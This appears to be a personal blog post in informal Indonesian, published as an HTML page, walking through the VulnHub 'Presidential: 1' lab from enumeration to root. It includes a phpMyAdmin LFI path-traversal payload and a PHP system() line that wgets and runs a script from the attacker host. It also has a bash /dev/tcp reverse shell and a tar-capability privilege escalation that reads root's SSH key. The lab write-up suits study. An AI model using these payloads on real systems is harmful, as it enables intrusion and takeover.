@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>VulnHub - Presidential: 1 | sharpicx</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="VulnHub - Presidential: 1" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Sebelumnya mohon maaf tentang kata/bahasa yang tidak pantas saya ucapkan disini dan juga saya adalah seorang pemalas yang malas untuk mengganti semua kata itu, karena ini adalah note lama saya yang sudah terpendam sekian lama." />
+<meta property="og:description" content="Sebelumnya mohon maaf tentang kata/bahasa yang tidak pantas saya ucapkan disini dan juga saya adalah seorang pemalas yang malas untuk mengganti semua kata itu, karena ini adalah note lama saya yang sudah terpendam sekian lama." />
+<link rel="canonical" href="http://localhost:4000/2020/07/12/vh-presidential" />
+<meta property="og:url" content="http://localhost:4000/2020/07/12/vh-presidential" />
+<meta property="og:site_name" content="sharpicx" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-12T00:00:00+07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="VulnHub - Presidential: 1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-07-12T00:00:00+07:00","datePublished":"2020-07-12T00:00:00+07:00","description":"Sebelumnya mohon maaf tentang kata/bahasa yang tidak pantas saya ucapkan disini dan juga saya adalah seorang pemalas yang malas untuk mengganti semua kata itu, karena ini adalah note lama saya yang sudah terpendam sekian lama.","headline":"VulnHub - Presidential: 1","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/07/12/vh-presidential"},"url":"http://localhost:4000/2020/07/12/vh-presidential"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<meta name="keywords" content="RCE,LFI,mis-config" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" href="/favicon.ico"/>
+<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
+<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
+<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
+<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+<!--[if lt IE 9]>
+  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>
+
+
+<script src="/assets/script/jekyllpaper.js" async ></script>
+<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>
+
+
+</head>
+<body>
+  <div class="container-wrapper">
+    <header class="container-header">
+      <div class="header-info">
+  <span class="header-info-name">sharpicx</span><br/>
+  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
+</div>
+<nav class="header-nav">
+  <ul class="header-main-nav">
+  
+    <li class="header-main-nav-item"><a href="/">home</a></li>
+  
+    <li class="header-main-nav-item"><a href="/category">categories</a></li>
+  
+    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
+  
+  </ul>
+</nav>
+
+    </header>
+    <main class="container-main">
+      <article class="container-post">
+  <div class="post-title" style="padding: 0px 0px 20px 0px">
+    <h1>VulnHub - Presidential: 1</h1>
+  </div>
+  <div class="post-author">
+    <span>sharpicx</span>
+  </div>
+  <div class="post-content">
+    <p>Sebelumnya mohon maaf tentang kata/bahasa yang tidak pantas saya ucapkan disini dan juga saya adalah seorang pemalas yang malas untuk mengganti semua kata itu, karena ini adalah note lama saya yang sudah terpendam sekian lama.</p>
+
+<p><strong><a href="https://www.vulnhub.com/entry/presidential-1,500/">Presidential</a></strong></p>
+
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="netdiscover">Netdiscover</h2>
+
+<p><code class="language-plaintext highlighter-rouge">netdiscover -i eth0</code></p>
+
+<p><img src="https://i.ibb.co/BT08BX6/netdiscover.jpg" alt="img" /></p>
+
+<p>gw coba satu” dan akhirnya ketemu juga <code class="language-plaintext highlighter-rouge">192.168.172.134</code>.</p>
+
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+
+<p>kali ini gw makenya <a href="https://github.com/RustScan/RustScan">RustScan</a> karena biar agak cepet dikit.<br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@skofos]:~/Desktop/vh/presidential# rustscan <span class="nt">-T</span> 1500 192.168.172.134 <span class="nt">--</span> <span class="nt">-A</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> presidential.scan
+
+     _____           _    _____                                                                                                                                                               
+    |  __ <span class="se">\ </span>        | |  / ____|                                                                                                                                                              
+    | |__<span class="o">)</span> |   _ ___| |_| <span class="o">(</span>___   ___ __ _ _ __                                                                                                                                                
+    |  _  / | | / __| __|<span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \                                                                                                                                               
+    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |                                                                                                                                              
+    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|                                                                                                                                              
+    Faster nmap scanning with rust.                                                                                                                                                           
+ Automated Decryption Tool - https://github.com/ciphey/ciphey 
+ Creator https://github.com/brandonskerritt
+WARNING: Your file description limit is lower than selected batch size. Please considering upping this (how to is on the README). NOTE: this may be dangerous and may cause harm to sensitive servers. Automatically reducing Batch Size to match your limit, this process isn'</span>t harmful but reduces speed.                                                                                 
+Open 80
+Open 2082
+Starting nmap.
+The Nmap <span class="nb">command </span>to be run is <span class="nt">-A</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> presidential.scan <span class="nt">-Pn</span> <span class="nt">-vvv</span> <span class="nt">-p</span> 80,2082 192.168.172.134
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-04 11:25 EDT
+NSE: Loaded 151 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+Initiating ARP Ping Scan at 11:25
+Scanning 192.168.172.134 <span class="o">[</span>1 port]
+Completed ARP Ping Scan at 11:25, 0.04s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Parallel DNS resolution of 1 host. at 11:25
+Completed Parallel DNS resolution of 1 host. at 11:25, 0.04s elapsed
+DNS resolution of 1 IPs took 0.05s. Mode: Async <span class="o">[</span><span class="c">#: 1, OK: 0, NX: 0, DR: 1, SF: 3, TR: 3, CN: 0]</span>
+Initiating SYN Stealth Scan at 11:25
+Scanning 192.168.172.134 <span class="o">[</span>2 ports]
+Discovered open port 80/tcp on 192.168.172.134
+Discovered open port 2082/tcp on 192.168.172.134
+Completed SYN Stealth Scan at 11:25, 0.05s elapsed <span class="o">(</span>2 total ports<span class="o">)</span>
+Initiating Service scan at 11:25
+Scanning 2 services on 192.168.172.134
+Completed Service scan at 11:25, 6.05s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
+Initiating OS detection <span class="o">(</span>try <span class="c">#1) against 192.168.172.134</span>
+NSE: Script scanning 192.168.172.134.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.28s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.01s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+Nmap scan report <span class="k">for </span>192.168.172.134
+Host is up, received arp-response <span class="o">(</span>0.00061s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2020-08-04 11:25:43 EDT <span class="k">for </span>8s
+
+PORT     STATE SERVICE REASON         VERSION
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.5.38<span class="o">)</span>
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.5.38
+|_http-title: Ontario Election Services &amp;raquo<span class="p">;</span> Vote Now!
+2082/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMI84YRpnLBsf4QIK/qH3yifMs49tmZDsZI54D8PxWcmSabJORvZTktzCgH1prKFSr0ZcYLFVGX10vn1v2VFFAXZexf5ApjUaJ0OpWNks3P2BIXMWdugkQ1MdP38lcRBksH6+a84dMeA3qtODwA2CpRkKUlhrLuUjlDiB+YAGDhH6Ku0uiGkYAu9zUSW6OETSmWU7BrixYvWJX0E3jWraevF3lgZCl7i0ou8si0b/iXEuQYX0qO4orcdEp1IAZX0K4j+hH7ssfRvlU9Y8wNDXMFvElbnObmS6Rn3s/y9Zru7RYVWu96dbVN1qWrLvdozuOYENVXwjdDiA2YGzD0Hy9
+|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDil7d9FyzMoBaDDMs6JSw8ZJfGi57gkbnU5ghrPBeYx9Lm4zHcP883tOQjnBthnyrjnvCTHfGlppDsdDmHS1eM</span><span class="o">=</span>
+|   256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIujGDZtzykOiJxKJi59sA5VD17ENBvz5UM3FdvghWJv
+MAC Address: 00:0C:29:A5:E0:BE <span class="o">(</span>VMware<span class="o">)</span>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>8/4%OT<span class="o">=</span>80%CT<span class="o">=</span>%CU<span class="o">=</span>44463%PV<span class="o">=</span>Y%DS<span class="o">=</span>1%DC<span class="o">=</span>D%G<span class="o">=</span>N%M<span class="o">=</span>000C29%TM<span class="o">=</span>
+OS:5F297DFF%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>108%GCD<span class="o">=</span>1%ISR<span class="o">=</span>109%TI<span class="o">=</span>Z%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span>O1
+OS:<span class="o">=</span>M5B4ST11NW7%O2<span class="o">=</span>M5B4ST11NW7%O3<span class="o">=</span>M5B4NNT11NW7%O4<span class="o">=</span>M5B4ST11NW7%O5<span class="o">=</span>M5B4ST11NW
+OS:7%O6<span class="o">=</span>M5B4ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>7120%W2<span class="o">=</span>7120%W3<span class="o">=</span>7120%W4<span class="o">=</span>7120%W5<span class="o">=</span>7120%W6<span class="o">=</span>7120<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>
+OS:Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>7210%O<span class="o">=</span>M5B4NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%R
+OS:D<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%
+OS:DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%
+OS:O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>4
+OS:0%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Uptime guess: 0.023 days <span class="o">(</span>since Tue Aug  4 10:52:48 2020<span class="o">)</span>
+Network Distance: 1 hop
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>264 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.61 ms 192.168.172.134
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.20 seconds
+           Raw packets sent: 25 <span class="o">(</span>1.894KB<span class="o">)</span> | Rcvd: 17 <span class="o">(</span>1.366KB<span class="o">)</span>
+</code></pre></div></div>
+<p>dari hasil <code class="language-plaintext highlighter-rouge">nmap</code> menurut gw sih gk ada jalan untuk melanjutkan, dan akhirnya gw putus asa dan mencoba untuk melihat-lihat website box ini. karena gw lola gw baru <em>ngeh</em> pas ngeliat email <code class="language-plaintext highlighter-rouge">contact@votenow.local</code> gw liat-liat tuh, gw kaget lah ini ada domainnya ajg jadi gw coba untuk memasukkan IP HOST dan domain box ini ke <code class="language-plaintext highlighter-rouge">/etc/hosts</code> habis itu gw <em>recon</em> lagi pake <code class="language-plaintext highlighter-rouge">gobuster</code> sapa tau ada yang aneh atau ngga.</p>
+
+<p><img src="https://i.ibb.co/0jNR0cy/hosts.png" alt="img2" /></p>
+
+<h2 id="gobuster-1">Gobuster #1</h2>
+
+<p>pas gw <code class="language-plaintext highlighter-rouge">gobuster</code> ternyata keluarnya ya gini” aja, ada yg ganjil.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://votenow.local/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,php.bak,html,txt
+</code></pre></div></div>
+<p><img src="https://i.ibb.co/tYyHgFn/gobuster.png" alt="img2" /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$dbUser</span> <span class="o">=</span> <span class="s2">"votebox"</span><span class="p">;</span>
+<span class="nv">$dbPass</span> <span class="o">=</span> <span class="s2">"casoj3FFASPsbyoRP"</span><span class="p">;</span>
+<span class="nv">$dbHost</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"votebox"</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>kata gw ini file backup-an yang sempet lupa untuk dihapus alias miss-configuration.</p>
+
+<h2 id="gobuster-2">Gobuster #2</h2>
+
+<p>mungkin ada lagi hal yang menarik kalo gw scan <em>recon</em> pake host dengan command yg ada dibawah ini, tapi nanti gw tau bakalan rame dan susah untuk dicari, jadi gw coba <em>grep</em>-in satu satu status dari host itu, dan akhirnya setelah gw coba gw dapetlah hal menarik dengan command <code class="language-plaintext highlighter-rouge">grep "Status: 200"</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost votenow.local <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost <span class="nt">-u</span> votenow.local <span class="nt">--wordlist</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | <span class="nb">grep</span> <span class="s2">"Status: 200"</span>                                                                             
+</code></pre></div></div>
+<p><img src="https://i.ibb.co/tZXQF8v/datasafe.png" alt="img4" /></p>
+
+<p>lalu, setelah gw dpt langsung coba. eh masuknya malah ke <em>mercusuar</em> kan gblk. jadi gw kepikiran untuk save dulu ke <code class="language-plaintext highlighter-rouge">/etc/hosts</code> dan akhirnya gw bisa masuk ke panel <code class="language-plaintext highlighter-rouge">PhpMyAdmin</code>lalu gw masuk dan pas itu gw lansung plonga plongo kek orang idiot gitu, dan tiba” gw ngeliat ke versi dari panel <em>PhpMyAdmin</em> ini langsung gw cari pake <code class="language-plaintext highlighter-rouge">searchsploit</code> siapa tau ada exploitnya / semacamnya lah. dan yah…</p>
+
+<p><img src="https://i.ibb.co/qRKkgbY/searchsploit.png" alt="img5" /></p>
+
+<p>lalu setelah gw nyari itu exploit gw ketemu <code class="language-plaintext highlighter-rouge">user:password</code> yang terenkripsi.</p>
+
+<p><img src="https://i.ibb.co/kqZDD1n/admin.png" alt="img6" /></p>
+
+<p>lalu gw crack lah pake <code class="language-plaintext highlighter-rouge">john</code> password cracking paling terkenal katanya. dan gw udah coba berkali-kali crack pake <em>dictionary wordlist</em> yg paling terkenal yaitu <em>rockyou.txt</em> lama beut cog ngecracknya wkwkwk, jadi gw pake single wordlist yg sedeng aja di path <code class="language-plaintext highlighter-rouge">/usr/share/john/password.lst</code> biar cepet.</p>
+
+<p><img src="https://i.ibb.co/nC2TCzW/password.png" alt="img7" /></p>
+
+<p>Dan password telah ter-crack. <code class="language-plaintext highlighter-rouge">Stella</code> merek apaan dah pewangi ruangan ya? wkwkwk. dan lanjut ke exploit buat dpt user flag.</p>
+
+<h1 id="exploit">Exploit</h1>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+
+<p>menurut <a href="https://www.exploit-db.com/exploits/44928">exploit</a>nya pertama tama gw harus masukin code yang dibawah ini ke SQL server-nya.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select '<span class="cp">&lt;?php</span> <span class="nb">phpInfo</span><span class="p">();</span><span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span>'
+</code></pre></div></div>
+
+<p><img src="https://i.ibb.co/7g8swxb/phpserverpng.png" alt="img8" /></p>
+
+<p>terus katanya masukin juga payload buat baca session file gitu.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="o">://</span><span class="n">datasafe</span><span class="mf">.</span><span class="n">votenow</span><span class="mf">.</span><span class="n">local</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">target</span><span class="o">=</span><span class="n">db_sql</span><span class="mf">.</span><span class="n">php</span><span class="o">%</span><span class="mi">253</span><span class="n">f</span><span class="o">/../../../../../../../../</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="nf">sess_</span><span class="p">(</span><span class="n">cookie</span> <span class="n">session</span><span class="p">,</span> <span class="n">kalo</span> <span class="n">g</span> <span class="n">tau</span> <span class="n">letak</span> <span class="n">cookie</span> <span class="n">pake</span> <span class="n">extension</span> <span class="n">di</span> <span class="n">browser</span> <span class="n">namanya</span> <span class="nc">CookieEditor</span><span class="p">)</span>
+</code></pre></div></div>
+<p>tapi kalo di gw kok malah error” gitu jadi karena ilmu gw dikit, gw putuskan untuk coba ngread file <em>passwd</em> dan pas gw test ternyata bisa.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="o">://</span><span class="n">datasafe</span><span class="mf">.</span><span class="n">votenow</span><span class="mf">.</span><span class="n">local</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">target</span><span class="o">=</span><span class="n">db_sql</span><span class="mf">.</span><span class="n">php</span><span class="o">%</span><span class="mi">253</span><span class="n">f</span><span class="o">/../../../../../../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</code></pre></div></div>
+
+<p><img src="https://i.ibb.co/XYyjLHz/passwd.png" alt="passwd" /></p>
+
+<p>dan hasilnya bisa, oke jadi langsung gw buat <em>payload</em> alias <em>reverse tcp shell</em> lewat sql server tadi.</p>
+
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+
+<p>jadi gw masukin <em>reverse shell</em> seperti yg gw bilang tadi, masukin lewat sql server.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select '<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"wget http://192.168.172.128:10/skofos.sh -o skofos.sh; chmod +x skofos.sh; bash skofos.sh;"</span><span class="p">);</span><span class="k">exit</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>ini code yang gw buat untuk <em>revere shell</em> nya</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span> /dev/tcp/192.168.172.128/1337 0&gt;&amp;1
+</code></pre></div></div>
+<p>yaudah habis itu gw nyalain <em>netcat</em> dgn port 1337 seperti yg gw buat di <em>reverse shell</em> itu.</p>
+
+<h2 id="usertxt">User.txt</h2>
+
+<p><img src="https://i.ibb.co/bsrf32K/netcat.png" alt="netcat" /></p>
+
+<p><img src="https://i.ibb.co/Lk18YT0/user.png" alt="lmao" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>pas saya baca itu ada <em>new command</em> aka perintah baru atau apa itu, untuk membackup suatu file dan meng-compress tanpa perlu ijin root. terus saya googling dan saya lupa sumbernya dari mana nanti kalo ketemu saya taro sini, jadi saya liat pake command <code class="language-plaintext highlighter-rouge">getcap -r / 2&gt;/dev/null</code>.</p>
+
+<p><img src="https://i.ibb.co/557vN7r/escalation.png" alt="getcap" /></p>
+
+<p>dan ketemulah <code class="language-plaintext highlighter-rouge">tarS</code> yg saya bilang tadi untuk compress tanpa ijin root/jadi root. habis tak compress langsung saya decompress biar filenya bisa dibaca.
+dan yeah, saya dapet itu <code class="language-plaintext highlighter-rouge">id_rsa</code> biar bisa masuk akses lewat <code class="language-plaintext highlighter-rouge">ssh</code> menjadi bagian root.</p>
+
+<p><img src="https://i.ibb.co/VjZLcGx/id-rsa.png" alt="id_rsa" /></p>
+
+<p><img src="https://i.ibb.co/Kysy52R/root.png" alt="root" /></p>
+
+<p>yaah, gw copy itu <code class="language-plaintext highlighter-rouge">id_rsa</code> dengan command <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> biar bisa ke akses, btw itu kenapa ada port 2082? kalo diperhatikan saat gw <em>recon</em> pake <code class="language-plaintext highlighter-rouge">nmap</code> kan disitu tertulis <em>port</em> untuk <code class="language-plaintext highlighter-rouge">ssh</code> yaitu 2082, jadi gw pake itu biar bisa masuk. okelaaah.</p>
+
+
+  </div>
+  <div class="post-info" style="padding-top: 25px">
+    <div class="post-date">
+      2020-07-12.
+    </div>
+    <div class="post-categories">
+      <span></span>
+      
+      <a href="/category/vulnhub" class="post-category">vulnhub</a>
+      
+    </div>
+    <div class="post-tags">
+      <span></span>
+      
+      <a href="/tag/rce" class="post-tag">RCE</a>
+      
+      <a href="/tag/lfi" class="post-tag">LFI</a>
+      
+      <a href="/tag/mis-config" class="post-tag">mis-config</a>
+      
+    </div>
+    <div class="post-tools">
+      
+      <div>
+        <span></span><a href="/2021/01/15/linux-rice">Linux Rice</a>
+      </div>
+      
+      
+      <div>
+        <span></span><a href="/2020/06/29/vh-infovore">VulnHub - Infovore: 1</a>
+      </div>
+      
+    </div>
+    
+  </div>
+</article>
+
+    </main>
+    <footer class="container-footer">
+      <div class="footer-copyright">
+  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
+  <span class="footer-copyright-text float-right">
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
+  </span>
+</div>
+
+    </footer>
+  </div>
+</body>
+</html>
